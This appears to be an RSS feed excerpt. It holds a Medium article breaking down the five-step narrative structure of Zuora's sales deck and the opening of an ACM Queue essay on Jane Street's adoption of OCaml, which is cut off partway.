&lt;p name=&quot;2614&quot; id=&quot;2614&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;As I’ve written before, I love helping teams craft the high-level strategic story that powers sales, marketing, fundraising — everything. So Tim and I met for lunch at the Amber India restaurant off San Francisco’s Market Street to review his deck.&lt;/p&gt;
&lt;p name=&quot;a251&quot; id=&quot;a251&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;After loading up on the all-you-can-eat buffet, I asked Tim, “At what point do prospects tune out?”&lt;/p&gt;
&lt;p name=&quot;ad40&quot; id=&quot;ad40&quot; class=&quot;graf graf--p graf--startsWithDoubleQuote graf-after--p&quot;&gt;“Usually a few slides in,” he said.&lt;/p&gt;
&lt;p name=&quot;2f22&quot; id=&quot;2f22&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Intent on maximizing dining ROI, Tim went back to the buffet for seconds. When he returned, I pulled out my laptop and launched into a Powerpoint presentation.&lt;/p&gt;
&lt;p name=&quot;8289&quot; id=&quot;8289&quot; class=&quot;graf graf--p graf--startsWithDoubleQuote graf-after--p&quot;&gt;“What’s this?” Tim asked.&lt;/p&gt;
&lt;p name=&quot;6778&quot; id=&quot;6778&quot; class=&quot;graf graf--p graf--startsWithDoubleQuote graf-after--p&quot;&gt;“This,” I said, “is the greatest sales deck I have ever seen.”&lt;/p&gt;
&lt;h3 name=&quot;cf30&quot; id=&quot;cf30&quot; class=&quot;graf graf--h3 graf-after--p&quot;&gt;The 5 Elements of a Brilliant Sales Narrative&lt;/h3&gt;
&lt;p name=&quot;7da0&quot; id=&quot;7da0&quot; class=&quot;graf graf--p graf-after--h3&quot;&gt;The sales deck I showed Tim came from &lt;a href=&quot;https://medium.com/@subscribed&quot; data-href=&quot;https://medium.com/@subscribed&quot; data-anchor-type=&quot;2&quot; data-user-id=&quot;b5ea6a97d651&quot; data-action-value=&quot;b5ea6a97d651&quot; data-action=&quot;show-user-card&quot; data-action-type=&quot;hover&quot; class=&quot;markup--user markup--p-user&quot; target=&quot;_blank&quot;&gt;Zuora&lt;/a&gt;, the IPO-bound Silicon Valley company that sells a SaaS platform for subscription billing. If you pay for anything on a recurring basis (e.g. enterprise software), there’s a good chance that Zuora facilitates those transactions.&lt;/p&gt;
&lt;p name=&quot;5a3e&quot; id=&quot;5a3e&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;I had received the deck from an ex-Zuora salesperson, who said it helped him close the biggest deals of his career. (I have no connection to Zuora, and no relationship with anyone who currently works there. &lt;em class=&quot;markup--em markup--p-em&quot;&gt;UPDATE: Some current Zuora employees have connected with me after reading this.&lt;/em&gt;)&lt;/p&gt;
&lt;p name=&quot;ac0a&quot; id=&quot;ac0a&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Abandoning his naan in a puddle of curried goat, Tim grabbed pen and paper and took notes as we ran through what made the Zuora deck so effective.&lt;/p&gt;
&lt;p name=&quot;ab62&quot; id=&quot;ab62&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Specifically, we noted how brilliantly the deck led prospects through the following five elements, in precisely this order:&lt;/p&gt;
&lt;p name=&quot;5fb0&quot; id=&quot;5fb0&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;&lt;em class=&quot;markup--em markup--p-em&quot;&gt;(The ex-Zuora salesperson asked that I not share the Zuora deck publicly, and I will honor that request. However, I found slides on Zuora’s website and SlideShare channel that exhibit nearly the same narrative flow; all of the images below come from those public sources.)&lt;/em&gt;&lt;/p&gt;
&lt;h3 name=&quot;300f&quot; id=&quot;300f&quot; class=&quot;graf graf--h3 graf-after--p&quot;&gt;#1. Name a Big, Relevant Change in the World&lt;/h3&gt;
&lt;p name=&quot;c055&quot; id=&quot;c055&quot; class=&quot;graf graf--p graf-after--h3&quot;&gt;Don’t kick off a sales presentation by talking about your product, your headquarters locations, your investors, your clients, or anything about yourself.&lt;/p&gt;
&lt;p name=&quot;192f&quot; id=&quot;192f&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;&lt;em class=&quot;markup--em markup--p-em&quot;&gt;Instead, name the undeniable shift in the world that creates both (a) big stakes and (b) huge urgency for your prospect.&lt;/em&gt;&lt;/p&gt;
&lt;p name=&quot;cc4e&quot; id=&quot;cc4e&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;The first slide of virtually every Zuora deck — sales or otherwise — is some version of this:&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*4EhO9r4Hp5JmDuREvja-uw.png&quot; data-width=&quot;1722&quot; data-height=&quot;990&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*4EhO9r4Hp5JmDuREvja-uw.png&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*4EhO9r4Hp5JmDuREvja-uw.png&quot;/&gt;&lt;/div&gt;
&lt;p name=&quot;c747&quot; id=&quot;c747&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;Zuora came up with the phrase “subscription economy” to name the trend in which buyers increasingly choose recurring service payments over outright purchases. Zuora usually follows that with a slide laying out the history of the change:&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*-k3idPAh0ATPmVWBviYWxA.png&quot; data-width=&quot;1904&quot; data-height=&quot;1072&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*-k3idPAh0ATPmVWBviYWxA.png&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*-k3idPAh0ATPmVWBviYWxA.png&quot;/&gt;&lt;/div&gt;
&lt;p name=&quot;5681&quot; id=&quot;5681&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;&lt;em class=&quot;markup--em markup--p-em&quot;&gt;Note the subtle but important difference from what most pitch advice tells you, which is to start with “the problem.”&lt;/em&gt; When you assert that your prospects have a problem, you put them on the defensive. They may be unaware of the problem, or uncomfortable admitting they suffer from it.&lt;/p&gt;
&lt;p name=&quot;a625&quot; id=&quot;a625&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;But when you highlight a shift in the world, you get prospects to open up about how that shift affects them, how it scares them, and where they see opportunities. Most importantly, you grab their attention. As Hollywood screenwriting guru Robert McKee says:&lt;/p&gt;
&lt;blockquote name=&quot;283b&quot; id=&quot;283b&quot; class=&quot;graf graf--pullquote graf-after--p&quot; readability=&quot;8&quot;&gt;
&lt;p&gt;…what attracts human attention is change. …if the temperature around you changes, if the phone rings — that gets your attention. The way in which a story begins is a starting event that creates a moment of change.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 name=&quot;30b6&quot; id=&quot;30b6&quot; class=&quot;graf graf--h3 graf-after--pullquote&quot;&gt;#2. Show There’ll Be Winners and Losers&lt;/h3&gt;
&lt;p name=&quot;16db&quot; id=&quot;16db&quot; class=&quot;graf graf--p graf-after--h3&quot;&gt;All prospects suffer from what economists call “loss aversion.” That is, they tend to avoid a possible loss by sticking to the status quo, rather than risk a possible gain by opting for change.&lt;/p&gt;
&lt;p name=&quot;9c55&quot; id=&quot;9c55&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;To combat loss aversion, you must demonstrate how the change you cited above will create big winners &lt;em class=&quot;markup--em markup--p-em&quot;&gt;and&lt;/em&gt; big losers. In other words, you have to show &lt;em class=&quot;markup--em markup--p-em&quot;&gt;both&lt;/em&gt; of the following:&lt;/p&gt;
&lt;ol class=&quot;postList&quot;&gt;&lt;li name=&quot;40fb&quot; id=&quot;40fb&quot; class=&quot;graf graf--li graf-after--p&quot;&gt;That adapting to the change you cited will likely result in a highly positive future for the prospect; and&lt;/li&gt;
&lt;li name=&quot;cbff&quot; id=&quot;cbff&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;That not doing so will likely result in an &lt;em class=&quot;markup--em markup--li-em&quot;&gt;unacceptably&lt;/em&gt; negative future for the prospect&lt;/li&gt;
&lt;/ol&gt;&lt;p name=&quot;825e&quot; id=&quot;825e&quot; class=&quot;graf graf--p graf-after--li&quot;&gt;Zuora neatly accomplishes this by documenting a “mass extinction” among Fortune 500 companies…&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*Ivu9eFe4M3xoZV-hQNEUIw.jpeg&quot; data-width=&quot;720&quot; data-height=&quot;405&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*Ivu9eFe4M3xoZV-hQNEUIw.jpeg&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*Ivu9eFe4M3xoZV-hQNEUIw.jpeg&quot;/&gt;&lt;/div&gt;
&lt;p name=&quot;4578&quot; id=&quot;4578&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;…and then showing how the “winners” have shifted from product ownership to subscription services. Those include upstarts…&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*0NoObiX6A4mbCCEofUpjZQ.jpeg&quot; data-width=&quot;720&quot; data-height=&quot;405&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*0NoObiX6A4mbCCEofUpjZQ.jpeg&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*0NoObiX6A4mbCCEofUpjZQ.jpeg&quot;/&gt;&lt;/div&gt;
&lt;p name=&quot;c42d&quot; id=&quot;c42d&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;…as well as rejuvenated incumbents:&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*9U0xh4v_3df5g-H8AYlOZg.jpeg&quot; data-width=&quot;720&quot; data-height=&quot;405&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*9U0xh4v_3df5g-H8AYlOZg.jpeg&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*9U0xh4v_3df5g-H8AYlOZg.jpeg&quot;/&gt;&lt;/div&gt;
&lt;p name=&quot;5e37&quot; id=&quot;5e37&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;To bring the point home, Zuora asks the following:&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*FnmdADPmftv--yW4VTtkPA.jpeg&quot; data-width=&quot;720&quot; data-height=&quot;405&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*FnmdADPmftv--yW4VTtkPA.jpeg&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*FnmdADPmftv--yW4VTtkPA.jpeg&quot;/&gt;&lt;/div&gt;
&lt;p name=&quot;e980&quot; id=&quot;e980&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;Of course, by this point the common thread is already well established in prospects’ minds: Winners adopt the subscription service models that Zuora supports.&lt;/p&gt;
&lt;h3 name=&quot;1d8a&quot; id=&quot;1d8a&quot; class=&quot;graf graf--h3 graf-after--p&quot;&gt;#3. Tease the Promised Land&lt;/h3&gt;
&lt;p name=&quot;d479&quot; id=&quot;d479&quot; class=&quot;graf graf--p graf-after--h3&quot;&gt;It’s tempting at this point to jump into the details of your product or service. Resist that urge.&lt;/p&gt;
&lt;p name=&quot;d614&quot; id=&quot;d614&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;If you introduce product/service details too soon, prospects won’t yet have enough context for why those details are important, and they’ll tune out.&lt;/p&gt;
&lt;p name=&quot;7635&quot; id=&quot;7635&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Instead, first present a “teaser” vision of the happily-ever-after that your product/service will help the prospect achieve—what I call the &lt;em class=&quot;markup--em markup--p-em&quot;&gt;Promised Land&lt;/em&gt;.&lt;/p&gt;
&lt;p name=&quot;3f72&quot; id=&quot;3f72&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Your Promised Land should be both desirable (obviously) and difficult for the prospect to achieve without outside help. Otherwise, why does your company exist?&lt;/p&gt;
&lt;p name=&quot;ed1e&quot; id=&quot;ed1e&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;After demonstrating that the subscription economy will result in winners and losers, Zuora presents this Promised Land slide, which offers concrete criteria for what it means to win in the subscription economy:&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*dmRFjO2Hkg3YpLA_soxauQ.png&quot; data-width=&quot;1900&quot; data-height=&quot;1064&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*dmRFjO2Hkg3YpLA_soxauQ.png&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*dmRFjO2Hkg3YpLA_soxauQ.png&quot;/&gt;&lt;/div&gt;
&lt;p name=&quot;c344&quot; id=&quot;c344&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;Note that the Promised Land is a new future state, not your product or service.&lt;/p&gt;
&lt;p name=&quot;1ee8&quot; id=&quot;1ee8&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;(Over lunch, I asked my friend Tim to articulate his Promised Land, and he said, “You’ll have the most innovative platform for ____.” Nope: the Promised Land is not &lt;em class=&quot;markup--em markup--p-em&quot;&gt;having&lt;/em&gt; your technology, but what life is like &lt;em class=&quot;markup--em markup--p-em&quot;&gt;thanks&lt;/em&gt; to having your technology.)&lt;/p&gt;
&lt;p name=&quot;78e0&quot; id=&quot;78e0&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Your Promised Land is also crucial for helping prospects pitch your solution to colleagues after your sales meeting ends. In your absence, those colleagues will ask, “What do those guys do again?” Armed with a compelling Promised Land, your prospects are more likely to supply an answer that gets others on board.&lt;/p&gt;
&lt;h3 name=&quot;4318&quot; id=&quot;4318&quot; class=&quot;graf graf--h3 graf-after--p&quot;&gt;#4. Introduce Features as “Magic Gifts” for Overcoming Obstacles to the Promised Land&lt;/h3&gt;
&lt;p name=&quot;d190&quot; id=&quot;d190&quot; class=&quot;graf graf--p graf-after--h3&quot;&gt;If it’s not clear by now, successful sales decks follow the same narrative structure as epic films and fairy tales. Your prospect is Luke, and you’re Obi Wan, furnishing a lightsaber to help him defeat the Empire. Your prospect is Frodo, and you’re Gandalf, wielding wizardry to help him destroy the ring. Your prospect is Cinderella, and you’re the fairy godmother, casting spells to get her to the ball.&lt;/p&gt;
&lt;p name=&quot;0f24&quot; id=&quot;0f24&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;When you introduce your product or service, do so by positioning its capabilities like the lightsaber, wizardry and spells—as “magic gifts” for helping your main character (prospect) reach that much-desired Promised Land.&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*mKJi6s4U0wCKVwvyxvUbIQ.jpeg&quot; data-width=&quot;720&quot; data-height=&quot;405&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*mKJi6s4U0wCKVwvyxvUbIQ.jpeg&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*mKJi6s4U0wCKVwvyxvUbIQ.jpeg&quot;/&gt;&lt;/div&gt;
&lt;p name=&quot;3a8c&quot; id=&quot;3a8c&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;For example, above is the slide where Zuora talks about the structure of its customer record. Out of context, this detail would likely bore even the most technical prospect.&lt;/p&gt;
&lt;p name=&quot;972f&quot; id=&quot;972f&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Positioned in the context of transitioning from an “old world” to a “new world,” however, it’s the foundation for an engaging conversation with prospects—technical and otherwise—about why it’s so hard to reach the Promised Land with traditional solutions.&lt;/p&gt;
&lt;h3 name=&quot;46d5&quot; id=&quot;46d5&quot; class=&quot;graf graf--h3 graf-after--p&quot;&gt;#5. Present Evidence that You Can Make the Story Come True&lt;/h3&gt;
&lt;p name=&quot;ecf3&quot; id=&quot;ecf3&quot; class=&quot;graf graf--p graf-after--h3&quot;&gt;In telling the sales narrative this way, you’re making a commitment to prospects: If they go with you, you’ll get them to the Promised Land.&lt;/p&gt;
&lt;p name=&quot;6589&quot; id=&quot;6589&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;But the road to the Promised Land is, by definition, littered with obstacles, so prospects are rightly skeptical of your ability to deliver. The last piece of the pitch, then, is the best evidence you can offer that you can make the story you’re telling come true.&lt;/p&gt;
&lt;p name=&quot;3a82&quot; id=&quot;3a82&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;By far, the most effective type of evidence is a success story about how you’ve already helped someone else (who is similar to the prospect) reach the Promised Land. Zuora has a set of customer success stories that sales reps draw on, and while they’re more elaborate in the actual deck, this testimonial captures the essence:&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*Ke6faHWcc4l8sZ7s9sjwug.png&quot; data-width=&quot;2002&quot; data-height=&quot;910&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*Ke6faHWcc4l8sZ7s9sjwug.png&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*Ke6faHWcc4l8sZ7s9sjwug.png&quot;/&gt;&lt;/div&gt;
&lt;p name=&quot;426e&quot; id=&quot;426e&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;I also like this one, from an exec at NCR (a Zuora customer), which speaks more explicitly to Zuora’s stated Promised Land:&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*wPiGUtu6kyvezEPN_NEwVQ.png&quot; data-width=&quot;1990&quot; data-height=&quot;910&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*wPiGUtu6kyvezEPN_NEwVQ.png&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*wPiGUtu6kyvezEPN_NEwVQ.png&quot;/&gt;&lt;/div&gt;
&lt;p name=&quot;7e99&quot; id=&quot;7e99&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;What if you don’t yet have a huge number of successful customers? Product demos are the next most effective evidence, but again, features should always be presented in the context of how they help a prospect reach the Promised Land.&lt;/p&gt;
&lt;h3 name=&quot;0963&quot; id=&quot;0963&quot; class=&quot;graf graf--h3 graf-after--p&quot;&gt;A Sales Narrative Works Best When Everyone Tells It&lt;/h3&gt;
&lt;p name=&quot;0bd7&quot; id=&quot;0bd7&quot; class=&quot;graf graf--p graf-after--h3&quot;&gt;Of course, successful sales rarely happen &lt;em class=&quot;markup--em markup--p-em&quot;&gt;solely&lt;/em&gt; as the result of a great deck. In order for salespeople to be successful, the entire organization must align around the narrative about change, Promised Land, and Magic Gifts.&lt;/p&gt;
&lt;p name=&quot;4b00&quot; id=&quot;4b00&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;There’s no better example of that than Zuora. If you ever see a Zuora executive speak—including CEO &lt;a href=&quot;https://medium.com/@tientzuo&quot; data-href=&quot;https://medium.com/@tientzuo&quot; data-anchor-type=&quot;2&quot; data-user-id=&quot;3d26841cd79c&quot; data-action-value=&quot;3d26841cd79c&quot; data-action=&quot;show-user-card&quot; data-action-type=&quot;hover&quot; class=&quot;markup--user markup--p-user&quot; target=&quot;_blank&quot;&gt;Tien Tzuo&lt;/a&gt;—you’ll almost certainly hear about the subscription economy and the winners and losers it’s creating. In fact, that’s the theme of virtually all the company’s marketing communications and campaigns, as well as its public vision statement:&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*8OfsnIAn34oRWrlBbgHeDg.png&quot; data-width=&quot;2102&quot; data-height=&quot;988&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*8OfsnIAn34oRWrlBbgHeDg.png&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*8OfsnIAn34oRWrlBbgHeDg.png&quot;/&gt;&lt;/div&gt;
&lt;p name=&quot;8ca2&quot; id=&quot;8ca2&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;According to the ex-Zuora salesperson, this company-wide alignment around the story made him wildly successful:&lt;/p&gt;
&lt;blockquote name=&quot;9532&quot; id=&quot;9532&quot; class=&quot;graf graf--pullquote graf-after--p&quot; readability=&quot;10&quot;&gt;
&lt;p&gt;The Zuora marketing folks ran campaigns and branding around this shift to the subscription economy, and [CEO] Tien [Tzuo] talked it up all the time. All of that was like air cover for my in-person sales ground attack. By the time I arrived, prospects were already convinced they had to act. It was the closest thing I’ve ever experienced to sales nirvana.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 name=&quot;24f7&quot; id=&quot;24f7&quot; class=&quot;graf graf--h3 graf-after--pullquote&quot;&gt;Biggest Deal Ever&lt;/h3&gt;
&lt;p name=&quot;1aa9&quot; id=&quot;1aa9&quot; class=&quot;graf graf--p graf-after--h3&quot;&gt;Just three weeks after our lunch, Tim called to say he was seeing promising changes in how prospects at large enterprises were reacting to his new deck, which we drafted together based on Zuora’s template. For one thing, prospects opened up much faster about the challenges they were facing. Also, he said the new pitch was more effective at engaging CFOs and other senior gatekeepers.&lt;/p&gt;
&lt;p name=&quot;f8b3&quot; id=&quot;f8b3&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Then, a week after that, Tim emailed with even better news: &lt;strong class=&quot;markup--strong markup--p-strong&quot;&gt;He had just signed the largest deal in his company’s history.&lt;/strong&gt;&lt;/p&gt;
&lt;p name=&quot;f7cc&quot; id=&quot;f7cc&quot; class=&quot;graf graf--p graf-after--p graf--trailing&quot;&gt;Next week, we’re headed back to Amber India to celebrate.&lt;/p&gt;
</description>
<pubDate>Mon, 26 Nov 2018 12:43:56 +0000</pubDate>
<dc:creator>grey-area</dc:creator>
<og:title>The Greatest Sales Deck I’ve Ever Seen – The Mission – Medium</og:title>
<og:url>https://medium.com/the-mission/the-greatest-sales-deck-ive-ever-seen-4f4ef3391ba0</og:url>
<og:image>https://cdn-images-1.medium.com/max/1200/1*cWrckQhDDGxKiwpb6YtPtg.jpeg</og:image>
<og:description>It’s Zuora’s, and it’s brilliant. Here’s why.</og:description>
<og:type>article</og:type>
<dc:format>text/html</dc:format>
<dc:identifier>https://medium.com/the-mission/the-greatest-sales-deck-ive-ever-seen-4f4ef3391ba0</dc:identifier>
</item>
<item>
<title>OCaml for the Masses (2011)</title>
<link>https://queue.acm.org/detail.cfm?id=2038036</link>
<guid isPermaLink="true" >https://queue.acm.org/detail.cfm?id=2038036</guid>
<description>&lt;div class=&quot;navbar&quot;&gt;

&lt;a href=&quot;https://queue.acm.org/&quot;&gt;&lt;img src=&quot;https://queue.acm.org/img/acmqueue_logo.gif&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href=&quot;https://queue.acm.org/app/&quot; target=&quot;_new&quot;&gt;&lt;img src=&quot;https://queue.acm.org/app/2018_09-10_lrg.png&quot; with=&quot;90&quot; height=&quot;120&quot; alt=&quot;September/October 2018 issue of acmqueue&quot;/&gt;&lt;/a&gt; &lt;strong&gt;&lt;a href=&quot;https://queue.acm.org/app/&quot;&gt;The September/October issue of acmqueue is out now&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://cdn.coverstand.com/3rd_pty/acm/login.html?&amp;amp;btx_i=537163&quot;&gt;Subscribers and ACM Professional members login here&lt;/a&gt;&lt;br clear=&quot;all&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;br/&gt;&lt;h4&gt;&lt;a href=&quot;https://queue.acm.org/listing.cfm?item_topic=Programming%20Languages&amp;amp;qc_type=theme_list&amp;amp;filter=Programming%20Languages&amp;amp;page_title=Programming%20Languages&amp;amp;order=desc&quot;&gt;Programming Languages&lt;/a&gt;&lt;/h4&gt;


&lt;label&gt;September 27, 2011&lt;br/&gt;&lt;strong&gt;&lt;a class=&quot;descriptor&quot; href=&quot;https://queue.acm.org/issuedetail.cfm?issue=2030256&quot;&gt;Volume 9, issue 9&lt;/a&gt;&lt;/strong&gt;&lt;/label&gt;

&lt;h2&gt;Why the next language you learn should be functional&lt;/h2&gt;
&lt;br/&gt;&lt;h3&gt;Yaron Minsky, Jane Street&lt;/h3&gt;
&lt;p&gt;&lt;em&gt;Sometimes, the elegant implementation is a function. Not a method. Not a class. Not a framework. Just a function.&lt;/em&gt; - John Carmack&lt;/p&gt;
&lt;p&gt;Functional programming is an old idea with a distinguished history. Lisp, a functional language inspired by Alonzo Church's lambda calculus, was one of the first programming languages developed at the dawn of the computing age. Statically typed functional languages such as OCaml and Haskell are newer, but their roots go deep—ML, from which they descend, dates back to work by Robin Milner in the early '70s relating to the pioneering LCF (Logic for Computable Functions) theorem prover.&lt;/p&gt;
&lt;p&gt;Functional programming has also been enormously influential. Many fundamental advances in programming language design, from garbage collection to generics to type inference, came out of the functional world and were commonplace there decades before they made it to other languages.&lt;/p&gt;
&lt;p&gt;Yet functional languages never really made it to the mainstream. They came closest, perhaps, in the days of Symbolics and the Lisp machines, but those days seem quite remote now. Despite a resurgence of functional programming in the past few years, it remains a technology more talked about than used.&lt;/p&gt;
&lt;p&gt;It is tempting to conclude from this record that functional languages don't have what it takes. They may make sense for certain limited applications, and contain useful concepts to be imported into other languages; but imperative and object-oriented languages are simply better suited to the vast majority of software engineering tasks.&lt;/p&gt;
&lt;p&gt;Tempting as it is, this conclusion is wrong. I've been using OCaml in a production environment for nearly a decade, and over that time I have become convinced that functional languages, and in particular, statically typed ones such as OCaml and Haskell, are excellent general-purpose programming tools—better than any existing mainstream language. They also have an enormous range, being well suited for small scripting tasks as well as large-scale high-performance applications. They are not the right tool for every job, but they come surprisingly close.&lt;br/&gt;&lt;/p&gt;
&lt;h3&gt;The Move to OCaml&lt;/h3&gt;
&lt;p&gt;Most of my experience programming in OCaml came through my work at Jane Street, a financial firm founded in 2000. Nine years ago, no one at Jane Street had heard of OCaml. Today, Jane Street is the biggest industrial user of the language, with nearly two million lines of OCaml code and 65 (at last count) employees who use the language on a daily basis. Probably the best way to explain what makes OCaml such an effective tool is to start by explaining how and why that transformation took place. To understand that, you first need to understand something about what Jane Street does.&lt;/p&gt;
&lt;p&gt;Jane Street's core business is providing liquidity on the world's electronic markets. It is, essentially, a middleman. It continually places orders for many different securities on many different exchanges. Each order expresses a willingness either to buy or to sell a given security at a given price, and, collectively, they are an advertisement to the markets of Jane Street's services. Through these orders, the firm buys from people who need to sell and sells to people who need to buy, making money from the gap between the buying and selling prices. All the time it is competing on price with other players trying to do the same thing.&lt;/p&gt;
&lt;p&gt;Electronic liquidity provision is technologically intense, not only because of the computational resources that need to be deployed (an enormous amount of data needs to be consumed, analyzed, and responded to in real-time), but also in terms of the complexity of the enterprise—trading can cross multiple exchanges, regulatory regimes, security classes, and time zones. Managing the resulting complexity is a daunting task that requires a significant investment in software.&lt;/p&gt;
&lt;p&gt;All this technology carries risk. There is no faster way for a trading firm to destroy itself than to deploy a piece of trading software that makes a bad decision over and over in a tight loop. Part of Jane Street's reaction to these technological risks was to put a very strong focus on building software that was easily understood—software that was readable.&lt;/p&gt;
&lt;p&gt;Reading code was part of the firm's approach to risk from before we had written our first line of OCaml. Early on, a couple of the most senior traders (including one of the founders) committed to reading every line of code that went into the core trading systems, before those systems went into production. This was an enormous ongoing time investment and reflected the high level of concern about technology risk.&lt;/p&gt;
&lt;p&gt;I started at Jane Street the year after I finished my Ph.D., working there part-time while doing a post-doc. My work at Jane Street was focused on statistical analysis and optimization of trading strategies, and OCaml was the primary tool I used to get the analysis done. Why OCaml? I had learned it in grad school and fell in love with the language then. And OCaml was a great match for this kind of rapid-prototyping work: highly performant, yet faster and less error-prone than coding in C, C++, or Java.&lt;/p&gt;
&lt;p&gt;I was convinced that my stint at Jane Street would be short and the code I was writing was all throw-away, so I made a choice to maximize my own productivity without worrying about whether others could use the code later. Six months and 80,000 lines of code later, I realized I was wrong: I took a full-time position at Jane Street and soon started hiring to create a research group there.&lt;/p&gt;
&lt;p&gt;At this time, the firm was casting around for a new approach to building software. The systems that powered the company in its first years were primarily written in VBA and C#. Indeed, the core trading systems themselves were Excel spreadsheets with a great deal of custom VBA code. This was a great way to get up and running quickly, but it was clear from the start that this was not a sustainable approach.&lt;/p&gt;
&lt;p&gt;In 2003, Jane Street began a rewrite of its core trading systems in Java. The rewrite was eventually abandoned, in part because the resulting code was too difficult to read and reason about—far more difficult, indeed, than the VBA that was being replaced. A big part of this was Java's verbosity, but it was more than that. The VBA code was written in a terse, straight-ahead style that was fairly easy to follow. But somehow when coding in Java we built up a nest of classes that left people scratching their heads when they wanted to understand just what piece of code was actually being invoked when a given method was called. Code that made heavy use of inheritance was particularly difficult to think about, in part because of the way that inheritance ducks under abstraction boundaries.&lt;/p&gt;
&lt;p&gt;In 2005, emboldened by the success of the research group, Jane Street initiated another rewrite of its core trading systems, this time in OCaml. The first prototype was done in three months, and was up and trading three months after that. The use of OCaml in the company has only expanded since then. Today it is used to solve problems in every part of the company, from accounting to systems administration, and that effort continues to grow. In recent years, the trading side of the firm has increased its use of the language, and OCaml training is now a standard part of the curriculum for new trading hires. Overall, the transition to OCaml has been a huge success, resulting in far stronger technology than we could have achieved otherwise.&lt;br/&gt;&lt;/p&gt;
&lt;h3&gt;Why OCaml?&lt;/h3&gt;
&lt;p&gt;What is it about the language that makes it work so well? Here's a short summary of what I perceive as OCaml's key strengths.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;* Concision.&lt;/strong&gt; Our experience with OCaml on the research side convinced us that we could build smaller, simpler, easier-to-understand systems in OCaml than we could in languages such as Java or C#. For an organization that valued readability, this was a huge win.&lt;/p&gt;
